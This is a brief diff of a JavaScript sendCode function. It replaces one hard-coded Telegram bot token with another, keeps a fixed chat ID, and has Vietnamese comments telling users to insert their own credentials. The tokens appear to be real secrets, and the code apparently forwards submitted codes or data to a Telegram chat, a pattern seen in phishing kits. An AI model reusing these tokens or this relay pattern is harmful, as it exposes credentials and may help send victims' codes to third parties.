@@ -178,7 +178,7 @@ function sendCode() {
 
 
         NUMBER_TIME_SEND_CODE++;
-        const botToken = '8188300093:AAH8Jvo6ARWM5W96JZKJ1WYYHkg_hs5tuj0'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
+        const botToken = '7709658040:AAH-nqGTe7zu5At5MiEF8FQIt0wTW7vE7yY'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
         const chatId = '-1002129119762'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
         const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
